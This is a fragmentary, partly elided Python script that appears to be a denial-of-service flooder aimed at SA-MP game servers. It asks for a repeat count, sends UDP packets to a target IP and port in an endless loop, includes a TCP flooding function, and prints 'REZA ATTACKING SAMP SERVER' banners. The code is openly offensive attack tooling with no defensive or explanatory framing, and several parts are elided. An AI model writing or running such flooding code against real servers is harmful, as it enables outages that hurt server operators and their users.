...
times = int(input(" \033[94m TIMES \033[1;31;40m      ====> : "))
	...
	while True:
		try:
			...
			for x in range(times):
				s.sendto(data,addr)
			print(" REZA ATTACKING SAMP SERVER IP %s PORT %s"%(ip,port))
		except:
			print(" REZA ATTACKING SAMP SERVER IP %s PORT %s"%(ip,port))
...
def tcp():
	...
	while True:
		try:
			...
			s.close()
			print("\033[1;31;40m REZA ATTACKING SAMP SERVER IP %s PORT %s"%(ip,port))
